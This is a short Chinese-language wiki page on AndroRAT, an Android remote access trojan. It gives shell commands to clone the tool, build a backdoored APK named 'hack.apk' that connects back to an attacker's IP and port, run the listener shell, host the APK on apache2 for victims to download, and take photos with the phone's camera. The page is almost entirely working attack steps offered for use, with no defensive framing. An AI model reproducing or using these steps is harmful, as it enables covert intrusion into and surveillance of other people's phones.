---
title: 01.AndroRAT
description: android远程管理工具
published: 1
date: 2023-04-24T10:34:41.852Z
tags: web tools
editor: markdown
dateCreated: 2023-04-19T17:49:03.242Z
---

<center>AndroRAT</center>



[toc]





### AndroRAT

> 一个简单的使用套接字的android远程管理工具 [github](https://github.com/karma9874/AndroRat)



```shell
# 下载
git clone https://github.com/karma9874/AndroRAT.git
cd AndroRAT
pip install -r requirements.txt
```



### 1. 使用

```shell
# 生成apk  
python3 androRAT.py --build -i 192.168.1.10 -p 8888 -o hack.apk

# 监控端
python3 
python3 androRAT.py --shell -i 0.0.0.0 -p 8888

# 开启apche2 让用户可以网站下载apk
sudo systemctl start apache2.service
# 安装打开 提示连接到客户了

help # 查看帮助文档
# 相机
acmList   takepic 0
```

